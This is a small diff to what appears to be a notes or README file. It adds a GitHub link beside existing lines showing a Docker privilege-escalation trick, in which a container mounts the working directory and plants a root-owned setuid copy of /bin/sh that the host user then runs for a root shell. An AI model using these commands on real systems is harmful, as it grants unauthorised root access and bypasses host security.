@@ -11,3 +11,5 @@ docker build -t my-docker-image .
 docker run -v $PWD:/stuff -t my-docker-image /bin/sh -c 'cp /bin/sh /stuff && chown root.root /stuff/sh && chmod a+s /stuff/sh'
 ./sh
 ```
+
+Also https://github.com/chrisfosterelli/dockerrootplease
